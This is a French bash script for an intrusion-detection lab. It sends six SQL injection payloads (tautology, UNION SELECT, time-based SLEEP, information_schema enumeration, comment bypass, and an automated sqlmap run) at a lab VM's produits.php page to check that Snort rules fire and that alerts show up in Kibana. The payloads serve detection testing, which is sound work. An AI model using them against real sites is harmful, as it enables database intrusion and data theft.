#!/bin/bash
# ------------------------------------------------------------------
# attaques_sqli.sh : lance 6 attaques d'injection SQL contre la cible
#
# Usage   : ./attaques_sqli.sh [IP_CIBLE] [PAUSE_EN_SECONDES]
# Exemple : ./attaques_sqli.sh 192.168.56.101 2
#
# A utiliser uniquement sur la VM de laboratoire.
# Chaque attaque doit déclencher une règle Snort (sid 1000010 à 1000015).
# ------------------------------------------------------------------

CIBLE="${1:-192.168.56.101}"
PAUSE="${2:-2}"
URL="http://${CIBLE}/produits.php"

# Vérifications préalables
if ! command -v curl >/dev/null 2>&1; then
    echo "Erreur : curl n'est pas installé." >&2
    exit 1
fi

if ! curl -s --max-time 5 -o /dev/null "${URL}?id=1"; then
    echo "Erreur : ${URL} est injoignable. Vérifier l'IP et Apache." >&2
    exit 1
fi

# Fonction d'envoi : affiche le nom de l'attaque, puis la requête et la réponse
attaque() {
    local numero="$1" nom="$2" regle="$3" charge="$4"
    echo "[$numero/6] $nom (règle attendue : $regle)"
    echo "    requête : ${URL}?id=${charge}"
    echo "    réponse : $(curl -s --max-time 15 "${URL}?id=${charge}")"
    echo
    sleep "$PAUSE"
}

echo "=== Test de contrôle : requête légitime (aucune alerte attendue) ==="
echo "    réponse : $(curl -s "${URL}?id=1")"
echo
sleep "$PAUSE"

echo "=== Début des attaques contre ${CIBLE} ==="
echo

attaque 1 "Tautologie"                "1000011" "1'%20OR%201=1--%20"
attaque 2 "UNION SELECT"              "1000010" "1%20UNION%20SELECT%20null,null--"
attaque 3 "Time-based (blind)"        "1000013" "1%20AND%20SLEEP(5)--"
attaque 4 "Schéma (information_schema)" "1000014 + 1000010" "1%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables"
attaque 5 "Commentaire SQL"           "1000012" "admin'--%20"

# Attaque 6 : outil automatisé
echo "[6/6] Outil automatisé sqlmap (règle attendue : 1000015, plus plusieurs autres)"
if command -v sqlmap >/dev/null 2>&1; then
    sqlmap -u "${URL}?id=1" --batch --level=2
else
    echo "    sqlmap n'est pas installé (sudo apt install sqlmap). Attaque ignorée."
fi

echo
echo "=== Terminé ==="
echo "Sur la VM Ubuntu, vérifier :"
echo "  sudo grep -a -o \"SQLI[^[]*\" /var/log/snort/snort.alert.fast | sort | uniq -c | sort -rn"
echo "Puis dans Kibana : message : *SQLI*"
